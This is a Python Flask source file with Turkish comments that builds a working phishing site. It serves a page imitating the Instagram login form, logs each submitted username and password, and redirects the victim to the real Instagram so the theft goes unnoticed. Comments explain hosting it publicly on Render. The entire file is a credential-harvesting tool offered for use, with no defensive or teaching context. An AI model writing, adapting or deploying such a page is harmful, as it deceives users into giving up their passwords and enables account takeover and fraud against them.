import os
from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

# INSTAGRAM GİRİŞ SAYFASI (TEK TIKLAMA LİNKİ)
HTML_SAYFASI = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1 style="font-style: italic;">Instagram</h1>
        <form action="/login" method="post">
            <input type="text" name="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
            <input type="password" name="p" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_SAYFASI)

@app.route('/login', methods=['POST'])
def login():
    kullanici = request.form.get('u')
    sifre = request.form.get('p')
    # Bilgileri log ekranına yazdırır
    print(f"GİRİŞ DENEMESİ -> Kullanıcı: {kullanici} | Şifre: {sifre}")
    # Girişten sonra gerçek Instagram'a yönlendirir
    return redirect("https://www.instagram.com")

# --- RENDER İÇİN KRİTİK AYARLAR ---
if __name__ == "__main__":
    # Render'ın verdiği 10000 portunu otomatik kullanır
    port = int(os.environ.get("PORT", 10000))
    # Dış dünyaya erişimi açar (Yeşil yanması için şart)
    app.run(host='0.0.0.0', port=port)
